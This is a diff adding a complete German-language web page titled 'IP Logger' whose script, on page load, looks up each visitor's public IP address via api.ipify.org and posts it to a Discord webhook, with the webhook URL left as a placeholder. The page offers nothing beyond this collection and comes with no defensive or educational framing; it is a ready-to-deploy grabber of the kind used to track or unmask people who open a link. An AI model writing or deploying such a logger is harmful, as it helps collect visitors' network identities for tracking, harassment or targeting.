@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IP Logger</title>
+</head>
+<body>
+    <h1>IP Logger</h1>
+    <p>Deine IP-Adresse wird ermittelt und an unseren Discord Webhook gesendet.</p>
+
+    <script>
+        // URL des Discord Webhooks
+        const webhookUrl = 'DEIN_DISCORD_WEBHOOK_URL';
+
+        // Funktion zum Abrufen der IP-Adresse
+        async function fetchIp() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error('Fehler beim Abrufen der IP-Adresse:', error);
+                return null;
+            }
+        }
+
+        // Funktion zum Senden der IP-Adresse an den Discord Webhook
+        async function sendIpToDiscord(ip) {
+            if (!ip) {
+                console.error('Keine IP-Adresse verfügbar.');
+                return;
+            }
+
+            const payload = {
+                content: `Besucher IP-Adresse: ${ip}`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(payload)
+                });
+                console.log('IP-Adresse erfolgreich an Discord gesendet.');
+            } catch (error) {
+                console.error('Fehler beim Senden der IP-Adresse an Discord:', error);
+            }
+        }
+
+        // Hauptfunktion zum Abrufen und Senden der IP-Adresse
+        async function logVisitorIp() {
+            const ip = await fetchIp();
+            await sendIpToDiscord(ip);
+        }
+
+        // Ausführen der Hauptfunktion
+        logVisitorIp();
+    </script>
+</body>
+</html>
